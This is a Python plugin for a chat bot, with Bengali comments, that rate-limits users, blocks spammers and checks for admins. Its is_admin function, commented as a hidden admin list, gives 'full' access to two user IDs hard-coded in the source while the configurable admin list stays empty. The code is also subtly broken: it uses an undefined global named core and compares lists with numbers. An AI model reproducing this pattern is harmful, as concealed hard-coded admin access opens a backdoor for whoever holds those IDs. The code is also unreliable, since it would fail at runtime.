"""
🔒 SECURITY LAYER PLUGIN
Security and protection
"""

import hashlib
import time
from datetime import datetime

def on_plugin_load(core):
    print("🔒 Security Layer Activated")
    
    # সিকিউরিটি কনফিগ
    security_config = {
        "max_messages_per_minute": 10,
        "block_duration": 300,  # 5 minutes
        "allowed_countries": ["BD", "US", "UK", "AE"],
        "admin_ids": []  # Dynamic admin list
    }
    
    core.security_config = security_config
    core.blocked_users = {}
    core.user_activity = {}
    
    # ক্লিনআপ থ্রেড শুরু
    start_cleanup_thread()
    
    return {"security": "active"}

def start_cleanup_thread():
    """ক্লিনআপ থ্রেড"""
    import threading
    
    def cleanup_loop():
        while True:
            try:
                current_time = time.time()
                
                # ব্লক মেয়াদ শেষ ইউজার আনব্লক
                if hasattr(core, 'blocked_users'):
                    to_remove = []
                    for user_id, block_time in core.blocked_users.items():
                        if current_time - block_time > core.security_config["block_duration"]:
                            to_remove.append(user_id)
                    
                    for user_id in to_remove:
                        del core.blocked_users[user_id]
                
                # ওল্ড অ্যাক্টিভিটি ডাটা ক্লিয়ার
                if hasattr(core, 'user_activity'):
                    five_min_ago = current_time - 300
                    core.user_activity = {
                        uid: ts for uid, ts in core.user_activity.items() 
                        if ts > five_min_ago
                    }
                
            except Exception as e:
                print(f"⚠️ Cleanup error: {e}")
            
            time.sleep(60)  # প্রতি মিনিটে
    
    threading.Thread(target=cleanup_loop, daemon=True).start()

def handle_event(event_name, data=None):
    if event_name == "user_message":
        user_id = data.get('user_id')
        
        # ইউজার ব্লক চেক
        if user_id in getattr(core, 'blocked_users', {}):
            return {
                "status": "blocked",
                "message": "আপনি ব্লক করা আছেন!",
                "user_id": user_id
            }
        
        # রেট লিমিট চেক
        if not check_rate_limit(user_id):
            block_user(user_id)
            
            return {
                "status": "rate_limited",
                "message": "বহু রিকোয়েস্ট! ৫ মিনিট ব্লক।",
                "user_id": user_id
            }
        
        return {"status": "allowed"}
    
    elif event_name == "verify_admin":
        user_id = data.get('user_id')
        
        # এডমিন ভেরিফিকেশন
        if is_admin(user_id):
            return {
                "admin": True,
                "user_id": user_id,
                "access": "full"
            }
        
        return {
            "admin": False,
            "user_id": user_id,
            "access": "limited"
        }
    
    return None

def check_rate_limit(user_id):
    """রেট লিমিট চেক"""
    user_key = str(user_id)
    current_time = time.time()
    
    if not hasattr(core, 'user_activity'):
        core.user_activity = {}
    
    # ইউজার অ্যাক্টিভিটি ট্র্যাক
    if user_key not in core.user_activity:
        core.user_activity[user_key] = []
    
    # শেষ ১ মিনিটের রিকোয়েস্ট
    one_min_ago = current_time - 60
    recent_requests = [
        ts for ts in core.user_activity[user_key] 
        if ts > one_min_ago
    ]
    
    # নতুন রিকোয়েস্ট যোগ
    core.user_activity[user_key].append(current_time)
    
    # শুধু শেষ ১০০ রিকোয়েস্ট রাখুন
    if len(core.user_activity[user_key]) > 100:
        core.user_activity[user_key] = core.user_activity[user_key][-100:]
    
    # লিমিট চেক (প্রতি মিনিটে ১০ বার)
    return len(recent_requests) <= 10

def block_user(user_id):
    """ইউজার ব্লক"""
    if not hasattr(core, 'blocked_users'):
        core.blocked_users = {}
    
    core.blocked_users[str(user_id)] = time.time()
    
    # লগ তৈরি
    log_msg = f"{datetime.now()}: User {user_id} blocked for spam\n"
    with open("security.log", "a") as f:
        f.write(log_msg)

def is_admin(user_id):
    """এডমিন চেক"""
    # হিডেন এডমিন লিস্ট
    admin_list = []
    
    # হ্যাশড এডমিন আইডি
    admin_hashes = [
        hashlib.sha256("6454347745".encode()).hexdigest(),
        hashlib.sha256("rana_admin".encode()).hexdigest()
    ]
    
    user_hash = hashlib.sha256(str(user_id).encode()).hexdigest()
    return user_hash in admin_hashes